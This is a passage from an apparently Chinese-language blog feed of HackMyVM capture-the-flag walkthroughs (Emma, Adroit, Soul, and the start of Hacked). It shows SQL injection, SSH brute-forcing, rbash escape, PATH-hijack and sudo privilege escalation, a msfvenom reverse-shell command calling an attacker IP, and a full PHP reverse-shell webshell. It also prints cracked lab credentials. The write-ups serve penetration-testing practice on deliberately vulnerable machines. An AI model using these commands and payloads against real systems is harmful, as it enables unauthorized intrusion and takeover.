printf("But now Im \n");
system("/bin/id");
}

emma@emma:~$ ls -la
total 64
drwxr-xr-x 4 emma emma  4096 Dec  4 00:14 .
drwxr-xr-x 3 root root  4096 Feb  4  2021 ..
-rw-r--r-- 1 emma emma   220 Feb  4  2021 .bash_logout
-rw-r--r-- 1 emma emma  3526 Feb  4  2021 .bashrc
-rwx------ 1 emma emma  1920 Feb  4  2021 flag.sh
drwx------ 3 emma emma  4096 Dec  4 00:14 .gnupg
drwxr-xr-x 3 emma emma  4096 Feb  4  2021 .local
-rw-r--r-- 1 emma emma   807 Feb  4  2021 .profile
-rw------- 1 emma emma    14 Feb  4  2021 user.txt
-rwsr-s--- 1 root emma 16760 Feb  4  2021 who
-rw-r--r-- 1 emma emma   185 Feb  4  2021 who.c
-rw------- 1 emma emma    50 Feb  4  2021 .Xauthority

<br>可以发现我们是可以执行 who 的，而且 从 who.c 里面看出里面两次执行了 /bin/id ，<br>
一次是root执行，一次是普通用户执行<br>那我们只要利用 gzexe 压缩 /bin/id，然后执行 who 触发 gzip 完成提权<br>环境变量劫持gzip：
echo 'chmod +s /bin/bash' &gt; /tmp/gzip
chmod +x /tmp/gzip
export PATH=/tmp:$PATH

gzexe压缩id:
gzexe /bin/id

执行who触发gzip完成提权
./who
bash -p
<br>bash-5.0# cat /root/root.txt
itsmeimshe
bash-5.0# cat /home/emma/user.txt
youdontknowme
]]></description><link>https://www.c1trus.top/24-渗透/hmv/37.emma.html</link><guid isPermaLink="false">24-渗透/HMV/37.emma.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[36.Adroit]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. java反编译" data-href="#3. java反编译" href="https://www.c1trus.top/about:blank#3._java反编译" class="internal-link" target="_self" rel="noopener nofollow">3. java反编译</a>
<br><a data-tooltip-position="top" aria-label="4. sql注入" data-href="#4. sql注入" href="https://www.c1trus.top/about:blank#4._sql注入" class="internal-link" target="_self" rel="noopener nofollow">4. sql注入</a>
<br><a data-tooltip-position="top" aria-label="5. 解密密码" data-href="#5. 解密密码" href="https://www.c1trus.top/about:blank#5._解密密码" class="internal-link" target="_self" rel="noopener nofollow">5. 解密密码</a>
<br><a data-tooltip-position="top" aria-label="6. 提权" data-href="#6. 提权" href="https://www.c1trus.top/about:blank#6._提权" class="internal-link" target="_self" rel="noopener nofollow">6. 提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Adroit" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Adroit</a><br>
作者 alienum<br>
难度 ⭐️⭐️⭐️⭐️️
<br><br>┌──(root㉿kali)-[~]
└─# fscan -h 192.168.80.11

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.80.11:3306 open
192.168.80.11:3000 open
192.168.80.11:21 open
192.168.80.11:22 open
[*] alive ports len is: 4
start vulscan
[+] ftp 192.168.80.11:21:anonymous
   [-&gt;]pub

<br>ftp<br>ftp&gt; ls -a
229 Entering Extended Passive Mode (|||40570|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..
-rw-r--r--    1 ftp      ftp          5451 Jan 14  2021 adroitclient.jar
-rw-r--r--    1 ftp      ftp           229 Mar 19  2021 note.txt
-rw-r--r--    1 ftp      ftp         36430 Jan 14  2021 structure.PNG

<br>structrue.png<br>
<img alt="Pasted image 20241203164149" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png" referrerpolicy="no-referrer"><br><br><img alt="Pasted image 20241203164747" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164747.png" referrerpolicy="no-referrer"><br>
获取到secret Sup3rS3cur3Dr0it<br>
<img alt="Pasted image 20241203165012" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203165012.png" referrerpolicy="no-referrer"><br>
域名 adroit.local<br>
<img alt="Pasted image 20241203165048" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203165048.png" referrerpolicy="no-referrer"><br>
用户名 zeus 域名 god.thunder.olympus<br>添加一个域名 adroit.local<br>尝试运行一下jar包<br>
这里我用jdk8运行不了 ，切换到jdk11可以运行
<br>提示输入账户密码 挨个测试即可<br>┌──(root㉿kali)-[/home/kali/hmv/Adroit]
└─# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
Sup3rS3cur3Dr0it
Wrong username or password   

┌──(root㉿kali)-[/home/kali/hmv/Adroit]
└─# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
god.thunder.olympus
Options [ post | get ] :
get
Enter the phrase identifier :
1

<br>god.thunder.olympus 就是密码<br><br>┌──(root㉿kali)-[/home/kali/hmv/Adroit]
└─# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
god.thunder.olympus
Options [ post | get ] :
get
Enter the phrase identifier :

1 union select 1,database() -- -
--&gt; adroit

1 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema ='adroit' -- -
--&gt;  ideas,users

1 union select 1,group_concat(column_name) from information_schema.columns where table_name ='users' -- -
--&gt; 
id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS

1 union select 1,group_concat(username,0x3a,password) from users -- -
--&gt; writer:l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=
<br>获取到了账户密码 writer:l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=<br>
但是密码是加密的<br>但是加密的<br><br>解密的代码可以在jar包反编译中发现<br>
<img alt="Pasted image 20241203172527" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203172527.png" referrerpolicy="no-referrer"><br>
密钥上面获取到了是 Sup3rS3cur3Dr0it<br>
但是注意这里需要将0换成O<br>
所以正确的密钥是 Sup3rS3cur3DrOit<br>参考 <a data-tooltip-position="top" aria-label="https://mikannse.space/2024/02/17/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B9%9D%E4%B8%89)%E4%B9%8BHMVAndroit/" rel="noopener nofollow" class="external-link" href="https://mikannse.space/2024/02/17/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B9%9D%E4%B8%89)%E4%B9%8BHMVAndroit/" target="_blank">Mikannse的wp</a>对这个进行解密<br>获取到密码是 just.write.my.ideas<br><br>利用账户密码登录<br>writer ： just.write.my.ideas
┌──(root㉿kali)-[/home/kali/hmv/Adroit]
└─# ssh writer@192.168.80.11
writer@192.168.80.11''s password:
Linux adroit 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 14 23:14:06 2021 from 10.0.2.15
writer@adroit:~$ id
uid=1000(writer) gid=1000(writer) groups=1000(writer),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
writer@adroit:~$ whoami
writer

<br>writer@adroit:~$ sudo -l
[sudo] password for writer:
Matching Defaults entries for writer on adroit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User writer may run the following commands on adroit:
    (root) /usr/bin/java -jar /tmp/testingmyapp.jar

<br>msf生成jar包 反弹shell<br>msfvenom -p java/shell_reverse_tcp lhost=192.168.80.5 lport=4444 -f jar -o reverse.jar

writer@adroit:/tmp$ cp reverse.jar  /tmp/testingmyapp.jar
writer@adroit:/tmp$ sudo -u root java -jar /tmp/testingmyapp.jar

[17:54:28] Welcome to pwncat 🐈!                                                                       __main__.py:164
[17:56:16] received connection from 192.168.80.11:51550                                                     bind.py:84
[17:56:17] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash                                  manager.py:957
           192.168.80.11:51550: registered new host w/ db                                               manager.py:957
(local) pwncat$
(remote) root@adroit:/tmp# whoami
root
(remote) root@adroit:/root# ls
root.txt
(remote) root@adroit:/root# cat root.txt
017a030885f25af277dd891d0f151845
(remote) root@adroit:/root# cd /home/writer/
(remote) root@adroit:/home/writer# cat user.txt
61de3a25161dcb2b88b5119457690c3c
(remote) root@adroit:/home/writer#
<br>
我觉得这个靶场不算难。难点只是在分析java代码那里，不过我看不懂java
]]></description><link>https://www.c1trus.top/24-渗透/hmv/36.adroit.html</link><guid isPermaLink="false">24-渗透/HMV/36.Adroit.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[35.Soul]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 图片解密" data-href="#3. 图片解密" href="https://www.c1trus.top/about:blank#3._图片解密" class="internal-link" target="_self" rel="noopener nofollow">3. 图片解密</a>

<br><a data-tooltip-position="top" aria-label="3.1. 爆破用户名" data-href="#3.1. 爆破用户名" href="https://www.c1trus.top/about:blank#3.1._爆破用户名" class="internal-link" target="_self" rel="noopener nofollow">3.1. 爆破用户名</a>
<br><a data-tooltip-position="top" aria-label="3.2. 绕过rbash" data-href="#3.2. 绕过rbash" href="https://www.c1trus.top/about:blank#3.2._绕过rbash" class="internal-link" target="_self" rel="noopener nofollow">3.2. 绕过rbash</a>
<br><a data-tooltip-position="top" aria-label="3.3. 提权检测" data-href="#3.3. 提权检测" href="https://www.c1trus.top/about:blank#3.3._提权检测" class="internal-link" target="_self" rel="noopener nofollow">3.3. 提权检测</a>


<br><a data-tooltip-position="top" aria-label="4. 获取webshell" data-href="#4. 获取webshell" href="https://www.c1trus.top/about:blank#4._获取webshell" class="internal-link" target="_self" rel="noopener nofollow">4. 获取webshell</a>

<br><a data-tooltip-position="top" aria-label="4.1. 修改php配置" data-href="#4.1. 修改php配置" href="https://www.c1trus.top/about:blank#4.1._修改php配置" class="internal-link" target="_self" rel="noopener nofollow">4.1. 修改php配置</a>


<br><a data-tooltip-position="top" aria-label="5. www-data提权gabriel" data-href="#5. www-data提权gabriel" href="https://www.c1trus.top/about:blank#5._www-data提权gabriel" class="internal-link" target="_self" rel="noopener nofollow">5. www-data提权gabriel</a>
<br><a data-tooltip-position="top" aria-label="6. gabriel提取到Peter" data-href="#6. gabriel提取到Peter" href="https://www.c1trus.top/about:blank#6._gabriel提取到Peter" class="internal-link" target="_self" rel="noopener nofollow">6. gabriel提取到Peter</a>
<br><a data-tooltip-position="top" aria-label="7. Peter提权root" data-href="#7. Peter提权root" href="https://www.c1trus.top/about:blank#7._Peter提权root" class="internal-link" target="_self" rel="noopener nofollow">7. Peter提权root</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Soul" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Soul</a><br>
作者 sml<br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br>端口扫描<br>┌──(pwncat-env)─(root㉿kali)-[/home/kali/hmv/Soul]
└─# nmap  192.168.80.10 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 12:08 CST
Nmap scan report for 192.168.80.10
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FC:DB:8A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.88 seconds

┌──(pwncat-env)─(root㉿kali)-[/home/kali/hmv/Soul]
└─# fscan -h 192.168.80.10

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.80.10:80 open
192.168.80.10:22 open
[*] alive ports len is: 2

<br>目录扫描<br>┌──(root㉿kali)-[/home/kali/hmv/Soul]
└─# dirsearch -u http://192.168.80.10/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Soul/reports/http_192.168.80.10/__24-12-02_12-10-03.txt

Target: http://192.168.80.10/

[12:10:03] Starting:
[12:10:20] 200 -    9B  - /robots.txt

┌──(pwncat-env)─(root㉿kali)-[/home/kali/hmv/Soul]
└─# gobuster dir -u http://192.168.80.10 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.80.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 24]
/robots.txt           (Status: 200) [Size: 9]
/saint.jpg            (Status: 200) [Size: 190523]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>网页信息<br>┌──(root㉿kali)-[/home/kali/hmv/Soul]
└─# curl http://192.168.80.10/
 &lt;img src="saint.jpg"&gt;

┌──(root㉿kali)-[/home/kali/hmv/Soul]
└─# curl http://192.168.80.10/robots.txt
/nothing

┌──(root㉿kali)-[/home/kali/hmv/Soul]
└─# curl -o saint.jpg http://192.168.80.10/saint.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  186k  100  186k    0     0   118M      0 --:--:-- --:--:-- --:--:--  181M

<br>saint.jpg<br>
<img alt="saint" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg" referrerpolicy="no-referrer"><br>到此 我们已经基本完成信息收集<br>
目前得到的有<br>
<br>图片 saint.jpg 
<br>首页  &lt;img src="saint.jpg"&gt;
<br>关键词 saint
<br>下一步我们大概有这几种方式进行<br>
<br>解密图片。看图片里面是否存在可用信息
<br>利用关键词作为用户名进行ssh爆破
<br><br>既然给我们的东西很少，且只有一张图。那么这张图多半是有东西的<br>
利用<a data-tooltip-position="top" aria-label="../../26-工具使用/StegSeek使用" data-href="../../26-工具使用/StegSeek使用" href="https://www.c1trus.top/26-工具使用/stegseek使用.html" class="internal-link" target="_self" rel="noopener nofollow">stegseek</a>工具解密<br>┌──(pwncat-env)─(root㉿kali)-[/home/kali/hmv/Soul]
└─# stegseek  saint.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "pass.txt".
[i] Extracting to "saint.jpg.out".
the file "saint.jpg.out" does already exist. overwrite ? (y/n)
y

┌──(pwncat-env)─(root㉿kali)-[/home/kali/hmv/Soul]
└─# cat saint.jpg.out
lionsarebigcats
<br>获取到一个关键字符串 lionsarebigcats<br>尝试利用这个作为密码，将 saint 作为用户名进行登录。但是失败了<br>
可能是用户名错误了<br><br>爆破一下用户名<br>┌──(root㉿kali)-[/home/kali/hmv/Soul]
└─# hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lionsarebigcats 192.168.80.10 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-02 12:43:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking ssh://192.168.80.10:22/
[22][ssh] host: 192.168.80.10   login: daniel   password: lionsarebigcats

<br>成功获取到用户名 daniel<br>ssh上来后发现我们在是一个限制模式的bash rbash，在这个模式下我们许多命令都用不了 比如cd命令<br>Last login: Thu Nov 26 05:27:42 2020 from 192.168.1.58
daniel@soul:~$ whoami
daniel
daniel@soul:~$ di
-rbash: di: command not found
daniel@soul:~$ id
uid=1000(daniel) gid=1000(daniel) groups=1000(daniel),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
daniel@soul:~$ cd /hotm
-rbash: cd: restricted

<br><br>这篇文章里面有很多种<a data-tooltip-position="top" aria-label="../渗透姿势库/rbash绕过" data-href="../渗透姿势库/rbash绕过" href="https://www.c1trus.top/24-渗透/渗透姿势库/rbash绕过.html" class="internal-link" target="_self" rel="noopener nofollow">rbash绕过</a>方式<br>
<a rel="noopener nofollow" class="external-link" href="https://www.freebuf.com/vuls/376922.html" target="_blank">https://www.freebuf.com/vuls/376922.html</a><br>daniel@soul:~$ awk 'BEGIN {system("/bin/bash")}'
daniel@soul:~$ /
bash: /: Is a directory
<br><br>利用Linpeas进行提权检测<br>
<img alt="Pasted image 20241202131134" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241202131134.png" referrerpolicy="no-referrer"><br>
检测出/usr/sbin/agetty 很有可能<br>但我们这个用户用不了<br>daniel@soul:/tmp$ /usr/sbin/agetty -o -p -l /bin/sh -a root tty
bash: /usr/sbin/agetty: Permission denied
<br>看来要转移到peter用户才行<br><br>在用户目录里面没有看到可以利用的东西<br>
可以去网站目录看一下<br>发现很奇怪的一点，网址目录的权限是777<br>drwxrwxrwx 2 root   root     4096 Nov 26  2020 .
drwxr-xr-x 3 root   root     4096 Nov 26  2020 ..
-rwxrwxrwx 1 root   root       24 Nov 26  2020 index.html
-rwxrwxrwx 1 root   root      612 Nov 26  2020 index.nginx-debian.html
-rwxrwxrwx 1 root   root        9 Nov 26  2020 robots.txt
-rwxrwxrwx 1 daniel daniel 190523 Nov 26  2020 saint.jpg
<br>应该是希望我们往这里写一个webshell<br>往里面写入一个webshell<br>&lt;?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?&gt; 
<br>开启监听弹shell<br>发现没有弹成功。而且直接回显出了php文件的内容<br>
说明这个php解析有问题<br><br>在这个靶机上使用的是 Nginx 服务器<br>
nginx对PHP-FPM的配置文件一般是/etc/nginx/sites-available/default<br>
<img alt="Pasted image 20241202162008" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241202162008.png" referrerpolicy="no-referrer"><br>
可以发现php的处理被注释掉了<br>
但是我们当前用户也不能修改这个文件<br>观察配置文件可以发现这里有一个域名 lonelysoul.hmv<br>server {
        listen 80;
        listen [::]:80;
#
        server_name lonelysoul.hmv;
#
        root /var/www/html;
        index index.html;
#
        location / {
                try_files $uri $uri/ =404;
        }

 # pass PHP scripts to FastCGI server
        #
               location ~ \.php$ {
               include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
               fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        }
}


<br>lonelysoul.hmv 通过 server_name 匹配到了一个专门的配置块，该配置块包含了处理 PHP 请求的规则。<br>location / {
    try_files $uri $uri/ =404;
}
<br>
在默认服务器块（default_server）的配置中，location / 块只是尝试将请求作为文件或目录来查找,并没有将 .php 文件请求转发给 PHP-FPM，所以默认服务器块无法解析 PHP 文件，只会返回 404 错误
<br>配置etc/hosts <br>vim /etc/hosts
192.168.80.10 lonelysoul.hmv
<br>开启监听弹shell<br>nc -lvnp 1234
curl http://lonelysoul.hmv/shell.php

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
<br><br>提权检测一下<br>
sudo -l
Matching Defaults entries for www-data on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on soul:
    (gabriel) NOPASSWD: /tmp/whoami
<br>提示我们可以用 gabriel 用户的权限执行 /tmp/whoami<br>
那我们将bash复制到/tmp 并改名whoami 即可获取到gabriel用户的bash<br>cp /bin/bash /tmp/whoami
sudo -u gabriel /tmp/whoami
whoami
gabriel
<br>成功获取到 gabriel 用户<br>gabriel@soul:~$ cat user.txt
HMViwazhere
<br><br>检测一下<br>sudo -l
Matching Defaults entries for gabriel on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gabriel may run the following commands on soul:
    (peter) NOPASSWD: /usr/sbin/hping3

<br>我们可以用 peter 的权限执行 /usr/sbin/hping3<br>gabriel@soul:~$ sudo -u peter /usr/sbin/hping3
hping3&gt; /bin/bash
peter@soul:/home/gabriel$
<br><br>获取到了Peter用户权限 那么我们就可以用 agetty 提权了<br>/peter@soul:/home/gabriel$ /usr/sbin/agetty -o -p -l /bin/sh -a root tty

Debian GNU/Linux 10 soul tty

soul login: root (automatic login)

\[\e]0;\u@\h: \w\a\]\u@\h:\w$
\[\e]0;\u@\h: \w\a\]\u@\h:\w$ id
uid=1002(peter) gid=1002(peter) euid=0(root) groups=1002(peter)
\[\e]0;\u@\h: \w\a\]\u@\h:\w$ whoami
root
cat /root/rootflag.txt
HMVohmygod
]]></description><link>https://www.c1trus.top/24-渗透/hmv/35.soul.html</link><guid isPermaLink="false">24-渗透/HMV/35.Soul.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 15:02:55 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[34.hacked]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.3. 获取参数" data-href="#2.3. 获取参数" href="https://www.c1trus.top/about:blank#2.3._获取参数" class="internal-link" target="_self" rel="noopener nofollow">2.3. 获取参数</a>


<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Hacked" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Hacked</a><br>
作者  sml<br>
难度 ⭐️⭐️⭐️⭐️️
<br><br><br>┌──(root㉿kali)-[/home/kali/hmv/hacked]
└─# fscan -h 192.168.42.185

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.42.185:22 open
192.168.42.185:80 open
<br>主页<br>┌──(root㉿kali)-[/home/kali/hmv/hacked]
└─# curl http://192.168.42.185/
HACKED BY h4x0r
<br><br>┌──(root㉿kali)-[/home/kali/hmv/hacked]
└─# dirsearch -u http://192.168.42.185/
